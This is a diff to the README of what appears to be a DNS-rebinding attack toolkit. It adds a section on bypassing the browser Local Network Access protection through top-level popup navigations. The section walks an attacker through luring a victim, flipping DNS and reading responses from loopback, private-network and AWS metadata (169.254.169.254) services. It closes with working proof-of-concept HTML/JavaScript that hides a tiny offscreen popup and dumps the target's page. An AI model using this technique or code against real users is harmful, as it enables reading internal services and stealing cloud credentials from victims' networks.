@@ -40,6 +40,7 @@ horizon/
 ├── README.md                     this file
 └── html/
     ├── amaze.html                attacker entry page (config + manager logic)
+    ├── lna-bypass.html           LNA navigation bypass PoC (standalone, no server needed)
     ├── payload.js              attack-frame logic (rebind loop, exfil dispatch)
     └── payloads/
         ├── aws-metadata-exfil.js   exfil rebound response to a webhook
@@ -229,6 +230,103 @@ Both iframes that need it already carry `allow="local-network-access *"`:
 
 These attributes are harmless if the server-side token isn't set yet, so
 you can roll out client and server independently.
+
+## LNA Navigation Bypass (new research)
+
+Chrome and Firefox now ship **Local Network Access (LNA)**: even a same-origin
+`fetch()` is blocked if the resolved IP is more local than the requesting
+origin's IP was at page load. This kills classic DNS-rebinding attacks that
+rely on `fetch` or `XMLHttpRequest` to read the rebound response.
+
+**But navigations are not guarded.** Top-level navigations (`window.open`,
+`location =`, `<a>` clicks) still resolve DNS and connect freely — LNA only
+gates subresource requests. This gives us a full bypass:
+
+### How it works
+
+1. **Attacker serves page** — victim visits `attacker.com` (your IP). You
+   serve `lna-bypass.html`, which opens a popup via `window.open("/", "popup")`.
+2. **Poll for rebind** — the page loops `fetch("/", {cache:"reload"})`. While
+   DNS still points to the attacker IP, fetches succeed normally.
+3. **Flip DNS** — you repoint `attacker.com` to `127.0.0.1` (or `192.168.x.x`,
+   `169.254.169.254`, any private/loopback target).
+4. **LNA kills fetch** — after the browser's ~60s DNS cache expires, the next
+   `fetch("/")` resolves to a local IP. LNA blocks it with a `TypeError`.
+   The page detects this as proof the rebind succeeded.
+5. **Navigate the popup** — `popup.location = "/"` is a top-level navigation,
+   which LNA does not block. The popup navigates to the target's `/`.
+6. **Read the response** — the popup is still "same origin" (same
+   scheme+host+port as the opener), so `popup.document.documentElement.outerHTML`
+   reads the target's full response. **CORS bypassed.**
+
+### What you get
+
+- Full DOM read of any HTTP service on `127.0.0.1`, `192.168.x.x`,
+  `10.x.x.x`, `169.254.169.254` (AWS IMDS), or any other private IP — from
+  a webpage the victim merely clicked on.
+- No special server binary needed. Any DNS rebinding setup that can flip an
+  A record works.
+- Works in current Chrome and Firefox (as of 2025). The LNA spec explicitly
+  exempts navigations.
+
+### Limitations
+
+- Requires a user gesture (click) to open the popup. Popup blockers will
+  kill it without one.
+- ~60s wait for the browser's DNS cache to expire. Not instant.
+- Only reads the initial page load. For multi-step interaction, combine with
+  the `Hook and Control` payload or script further navigations from the popup
+  reference.
+- The popup is visible (though offscreen and tiny). A very attentive user
+  might notice it in the taskbar.
+
+### File
+
+`html/lna-bypass.html` — standalone PoC. No Singularity binary needed.
+
+### vs. the Origin-Trial bypass (existing)
+
+The existing LNA bypass in this repo (see "Enabling LNA bypass" above) uses
+Chrome's **Origin-Trial** mechanism to opt into "Local Network Access from
+Non-Secure Contexts," which tells Chrome to allow the requests. That requires:
+- Rebuilding the Singularity server with the experimental branch
+- Registering a token in Chrome's Origin Trials portal
+- The trial to still be active (Google can revoke it)
+
+The navigation bypass needs **none of that**. It works against stock
+Chrome/Firefox with no server modifications and no trial tokens. It's the
+strictly better approach for new attacks unless you need `fetch`-level
+control (e.g. custom headers, POST bodies), in which case the Origin-Trial
+path is still needed.
+
+### PoC code (condensed)
+
+```html
+<p id="msg">Click once</p>
+<script>
+  if (name === "popup") msg.innerText = "Wait ~60s...";
+  onclick = async () => {
+    onclick = null;
+    w = window.open("/", "popup", "width=1,height=1,top=9999,left=9999");
+
+    msg.innerText = "Wait ~60s...";
+    while (true) {
+      try {
+        const text = await fetch("/", { cache: "reload" }).then(r => r.text());
+      } catch (e) {
+        break;  // LNA error means we rebinded successfully
+      }
+      await new Promise(r => setTimeout(r, 2000));
+    }
+    msg.innerText = "Rebind successful! Check console";
+
+    w.location = "/";  // top-level navigation still works
+    setTimeout(() => {
+      console.log(w.document.documentElement.outerHTML);  // same-origin read
+    }, 2000);
+  }
+</script>
+```
 
 ## What was stripped from the upstream/fork
 
